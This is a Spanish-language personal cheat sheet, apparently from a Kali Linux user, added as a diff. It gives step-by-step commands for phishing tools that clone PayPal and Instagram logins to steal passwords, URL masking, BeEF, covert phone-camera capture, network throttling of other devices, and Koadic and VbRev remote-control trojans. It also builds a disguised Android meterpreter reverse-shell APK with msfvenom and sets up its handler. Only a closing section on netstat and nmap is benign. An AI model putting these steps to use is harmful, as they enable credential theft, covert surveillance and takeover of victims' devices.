@@ -1,0 +1,246 @@
+https://github.com/htr-tech/zpisher
+
+https://github.com/htr-tech/zphisher.git    ------para sacar contraseñas ------
+
+1.-paso copiar en Linux el primer código  ------
+paso dos se creara una carpeta llamada :
+2.- entrar a Linux comando y :    git clone https://github.com/htr-tech/zpisher
+se creara una carpeta llamada :   zphisher   --- entramos con cd zphisher
+3.- entrar co este comando   bash zphisher.sh     -------y ejecutarlo
+se abrirá una pantalla que se puede escoger :   PayPal , Instagram  etc 
+s eescoge con los numero luego siempre la opción   
+	1.-  tradicional login page
+	2.-  cloud lared 
+  do you want a custom port    n
+  do you change mask  url      n
+ es todo:   se generara una pagina false que se puede copear la url y selo pega en un navegador 
+se puede ver contraseñas  y nombre   (primera opcion)
+  ######################################################
+2sa opción 
+ https://github.com/jaykali/maskphish.git
+
+comando 
+git clone https://github.com/jaykali/maskphish.git
+┌──(root㉿kali)-[~]
+└─# cd maskphish
+                                                                                                     
+┌──(root㉿kali)-[~/maskphish]
+└─# ls
+LICENSE  maskphish.sh  README.md
+                                                                                                     
+┌──(root㉿kali)-[~/maskphish]
+└─# 
+                                                                                                     
+┌──(root㉿kali)-[~/maskphish]
+└─# bash maskphish.sh
+
+
+ Please Visit  https://www.kalilinux.in 
+    Copyright    JayKali  
+
+
+ ### Phishing URL ### 
+
+Paste Phishing URL here (with http or https): https://instagram.com
+Processing and Modifing Phishing URL
+
+
+ ### Masking Domain ###
+Domain to mask the Phishing URL (with http or https), ex: https://google.com, http
+://anything.org) :
+=> https
+
+Type social engineering words:(like free-money, best-pubg-tricks)
+Don't use space just use '-' between social engineering words
+=> support
+
+Generating MaskPhish Link...
+
+Here is the MaskPhish URL: https-support@is.gd/Mjany0 
+################################################################con  maskphish.sh
+
+
+comando para capturar pasword        sudo apt install beef-xss
+luego en la barra de búsqueda se coloca   beef start
+
+aparece una ventana  que dice:
+sudo beef-xss
+[sudo] password for kali: 
+
+################################################
+-----------otro metodo seguro  -------------
+-se instala recomendado  en home/kali
+
+git clone https://github.com/beefproject/beef.git
+cd beef
+./install
+
+se instala .-
+1.- update-beef
+3.-   ./beef    ----para ejecuatar el programa
+
+##################################################
+capturador de imagenes  del celular
+1.-
+git clone https://github.com/techchipnet/CamPhish.git
+
+cd camphish
+
+
+para ejecutar una vez instalado
+
+chmod +x camphish.sh
+./camphish.sh    -------o-----bash caphish.sh
+
+se generara opciones al final 
+saldra una direccion  se en via la direccion
+por cel y captura la foto siempre y cuamdo del otro lado se de permisos de camara
+(defecto)
+###################################################
+program muy util:
+RESTRINGIR EL INTERNET ELL ANCHO DE BANDA  O ANULAR UN DISPOSITIVO
+	programa:     EVIL LIMITER
+comando : 
+git clone  https://github.com/bitbrute/evillimiter.git
+
+cd evillimiter
+--
+sudo python3 setup.py install    --- seguir los pasos ----
+
+ls bin
+ sudo python3 bin/evillimiter
+
+┌──(root㉿kali)-[/home/kali/evillimiter]
+└─# ls
+bin        CODE_OF_CONDUCT.md  evillimiter           README.md
+build      CONTRIBUTORS.md     evillimiter.egg-info  setup.py
+CHANGELOG  dist                LICENSE
+                                                                                  
+┌──(root㉿kali)-[/home/kali/evillimiter]
+└─# ls
+bin        CODE_OF_CONDUCT.md  evillimiter           README.md
+build      CONTRIBUTORS.md     evillimiter.egg-info  setup.py
+CHANGELOG  dist                LICENSE
+                                                                                  
+┌──(root㉿kali)-[/home/kali/evillimiter]
+└─# ls bin
+evillimiter
+                                                                                  
+┌──(root㉿kali)-[/home/kali/evillimiter]
+└─# python3 bin/evillimiter 
+
+(corre el programa)
+hellp
+
+comando    scan
+
+	hosts
+
+(aparecera una lista de ips de l cooenxion en red)
+
+help
+
+item    0
+	1
+	2
+
+###   PARA LIMITAR EL ANCHO DE BANDA EJEMPLO DISP-  4
+  limit 4 200kbit --upload
+  limit 4 200kbit --download
+###  PARA LIBERAÑO A LA FORMA NORMAL  
+ free 4
+hosts  
+  
+  #####PARA BLOQUEAR EL INTERNET A UN DISPOSITIVO
+block 4 --upload
+(bloquado solo carga)
+
+block 4  --download 
+(bloqueada la descargar)
+"##### PARA LIBERAR EL DISPOSITIVO
+
+ free 4
+
+fin.
+##############################################
+programa para controlar una pc con una direccion
+
+-----------------KOADIC----------FUNCIONA (LA MAQUINA INFECTADA TINE  QUE EL DEFENDER ACEPTARLO AL VIRUS TROYANO----------)
+EJECUTAR EN LINUX COMANDO
+""""""""""""""""""""""""""""""""
+	koadic        pueto :::::: 9494
+
+use stager/js/
+[-] No module named stager/js/
+(koadic: sta/js/mshta)# use stager/js/mshta
+(koadic: sta/js/mshta)# options
+ use stager/js/
+[-] No module named stager/js/
+(koadic: sta/js/mshta)# use stager/js/mshta
+(koadic: sta/js/mshta)# options
+ 
+(koadic: sta/js/mshta)# set SRVPOT 9494
+[-] Option 'SRVPOT' not found.
+(koadic: sta/js/mshta)# SET SRVPORT 9494
+[+] SRVPORT => 9494
+(koadic: sta/js/mshta)# run
+
+COPIAR EL LINK QUE VIENE CON EL   """"  MHSTA 192.168.0.37(EJEMPLO)
+
+COMANDO ZOMBIES   PARA VER QUE MAQUINA SE PUEDE INFECTAR
+############################################################
+otro que funciona como el KOADIC Y HACE LO MISMO
+"" la diferencia esque tiene problemas de correr en Linux pero w11 corre bien
+-----------programa   VbRev-----------
+ejecutar en el principal  el programa        (FUNCIONA)
+1.-   (anfitrion) VbRevUi
+2.- (huesped)  y ejecutar en otra PC VbRev.exe 192.168.0.37 4444    -----4444--- puerto
+###################################################################
+
+CREAR UN VIRUS  E INFECTAR A ANDROID 
+COMANDO:
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.37 LPORT=4444 -o  ModayBelleza.apk
+
+
+(CREARA UN APK)  impotante  AVRIR ESTE COMANDO 
+
+msfconsole
+ SE ABRE UNA PANTALLA
+set payload windows/meterpreter/reverse_tcp    ---> PARECE QUE  DE WINDOW
+set payload android/meterpreter/reverse_tcp   ----> PARECE DE ANDROID
+
+1.-    use exploit/multi/handler
+2.-  set payload android/meterpreter/reverse_tcp
+3.   set LHOST 192.168.1.9
+4.-  set LPORT 4444
+5.- exploit                              
+##########################
+verifica quie esta usando el puerto
+
+1.-  sudo lsof -i :4444   ----(9494)-----
+2.-  nmap
+3.-Aquí tienes algunas opciones:
+
+Usando netstat:
+El comando netstat muestra información sobre conexiones de red. Para listar todos los puertos TCP o UDP que están siendo escuchados, incluyendo los servicios que utilizan esos puertos y el estado del socket, ejecuta:
+sudo netstat -tunlp
+
+-t: Muestra los puertos TCP.
+-u: Muestra los puertos UDP.
+-n: Muestra direcciones numéricas en lugar de resolver nombres.
+-l: Muestra solo los puertos en escucha.
+-p: Muestra el PID y el nombre del proceso del oyente. Esto solo se muestra si ejecutas el comando como usuario root o con sudo.
+El resultado mostrará los puertos en uso junto con los procesos asociados.
+Usando nmap:
+nmap es una herramienta de escaneo de puertos. Puedes usarlo para escanear puertos en una máquina específica. Por ejemplo:
+nmap 192.168.56.101
+También puedes especificar un rango de puertos:
+nmap -p 1-1000 192.168.56.101
+
+Usando nping:
+nping es otra herramienta para escanear puertos. Por ejemplo, para escanear el puerto 22 en una máquina remota:
+nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1
+#####################################################
+
+
+
